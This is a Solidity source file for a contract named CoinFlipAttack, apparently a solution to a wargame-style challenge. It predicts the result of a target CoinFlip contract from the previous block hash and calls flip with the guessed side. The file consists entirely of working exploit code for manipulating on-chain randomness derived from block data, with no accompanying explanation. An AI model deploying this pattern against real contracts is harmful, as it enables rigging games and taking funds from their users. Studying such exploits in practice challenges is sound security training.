// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "CoinFlip/CoinFlip.sol";

contract CoinFlipAttack{
    CoinFlip CoinFlipInstance;

    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _CoinFlipAddress){
        CoinFlipInstance = CoinFlip(_CoinFlipAddress);
    }

    function flipAttack() external{
        uint256 blockValue = uint256(blockhash(block.number - 1));

        //prevent your count from being reset to zero
        if (lastHash == blockValue) {
        revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        CoinFlipInstance.flip(side);

    }
}